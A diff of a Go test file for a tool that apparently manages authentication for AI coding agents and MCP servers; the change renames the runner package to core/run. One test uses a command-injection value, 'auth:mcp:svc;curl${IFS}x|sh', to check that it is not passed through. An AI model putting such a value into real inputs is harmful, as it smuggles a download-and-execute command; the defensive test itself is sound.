@@ -12,7 +12,7 @@ import (
 	"github.com/lorem-dev/duolog/internal/auth"
 	"github.com/lorem-dev/duolog/internal/capability"
 	"github.com/lorem-dev/duolog/internal/core/mode"
-	"github.com/lorem-dev/duolog/internal/runner"
+	"github.com/lorem-dev/duolog/internal/core/run"
 )
 
 // fakeChecker answers the login checks of a test. A problem stays until a
@@ -148,7 +148,7 @@ func TestAuthFailureActions(t *testing.T) {
 func TestRunTimeRejection(t *testing.T) {
 	h := authHarness(t)
 	h.inventories(capability.Inventory{Agent: "codex", Items: []capability.Item{{Kind: "mcp", Name: "wiki"}}}, capability.Inventory{Agent: "claude"})
-	h.results = []runner.Result{{Done: false, Summary: "wiki said 401", Files: []string{}, Needs: []string{"auth:mcp:wiki"}}}
+	h.results = []run.Result{{Done: false, Summary: "wiki said 401", Files: []string{}, Needs: []string{"auth:mcp:wiki"}}}
 	h.auth.login = auth.LoggedIn
 	o, e := h.runNeeds("implement", "mcp:wiki")
 	h.requireCalls(2)
@@ -163,14 +163,14 @@ func TestRunTimeRejection(t *testing.T) {
 
 func TestRunTimeAgentFailureWithStaticBridgedToken(t *testing.T) {
 	h := bridgeHarness(t)
-	h.results = []runner.Result{{Done: false, Summary: "jira said 401", Files: []string{}, Needs: []string{"auth:mcp:jira"}}}
+	h.results = []run.Result{{Done: false, Summary: "jira said 401", Files: []string{}, Needs: []string{"auth:mcp:jira"}}}
 	o, e := h.runNeeds("implement", "mcp:jira")
 	h.requireCalls(1)
 	if e != nil || len(h.auth.logins) != 0 || len(o.Needs) != 1 || o.Needs[0] != "mcp:jira" || !strings.Contains(o.Line, ".claude.json mcpServers") || strings.Contains(o.Line, leadToken) {
 		t.Fatal(o, e)
 	}
 	// The agent refusing its own login during the run is classified too.
-	h.results = []runner.Result{{AuthFailed: true}}
+	h.results = []run.Result{{AuthFailed: true}}
 	h.calls = nil
 	h.auth.login = auth.Declined
 	o, e = h.run("implement")
@@ -205,13 +205,13 @@ func TestServersCheckedAfterAgentLogin(t *testing.T) {
 func TestRunProblemsTrustOnlyTheTask(t *testing.T) {
 	h := authHarness(t)
 	h.inventories(capability.Inventory{Agent: "codex", Items: []capability.Item{{Kind: "mcp", Name: "wiki"}}}, capability.Inventory{Agent: "claude"})
-	h.results = []runner.Result{{Done: true, Summary: "all tests pass", Files: []string{"a.go"}, Needs: []string{}, AuthFailed: true}}
+	h.results = []run.Result{{Done: true, Summary: "all tests pass", Files: []string{"a.go"}, Needs: []string{}, AuthFailed: true}}
 	o, e := h.runNeeds("implement", "mcp:wiki")
 	if e != nil || len(h.auth.logins) != 0 || !strings.HasPrefix(o.Line, "done=true") {
 		t.Fatal(o.Line, e)
 	}
 	h.calls = nil
-	h.results = []runner.Result{{Done: false, Summary: "x", Files: []string{}, Needs: []string{"auth:mcp:svc;curl${IFS}x|sh"}}}
+	h.results = []run.Result{{Done: false, Summary: "x", Files: []string{}, Needs: []string{"auth:mcp:svc;curl${IFS}x|sh"}}}
 	o, e = h.runNeeds("implement", "mcp:wiki")
 	if e != nil || len(h.auth.logins) != 0 || strings.Contains(o.Line, "curl") && strings.Contains(o.Line, "! ") {
 		t.Fatal(o.Line, e, h.auth.logins)
@@ -233,7 +233,7 @@ func TestPreflightSkipsUnapprovedServer(t *testing.T) {
 func TestErrorNamedServerMustBeInTask(t *testing.T) {
 	h := authHarness(t)
 	h.inventories(capability.Inventory{Agent: "codex", Items: []capability.Item{{Kind: "mcp", Name: "wiki"}}}, capability.Inventory{Agent: "claude"})
-	h.results = []runner.Result{{Done: false, Summary: "x", Files: []string{}, Needs: []string{}, AuthFailed: true, AuthServer: "other"}}
+	h.results = []run.Result{{Done: false, Summary: "x", Files: []string{}, Needs: []string{}, AuthFailed: true, AuthServer: "other"}}
 	if _, e := h.runNeeds("implement", "mcp:wiki"); e != nil || len(h.auth.logins) != 0 {
 		t.Fatal(e, h.auth.logins)
 	}
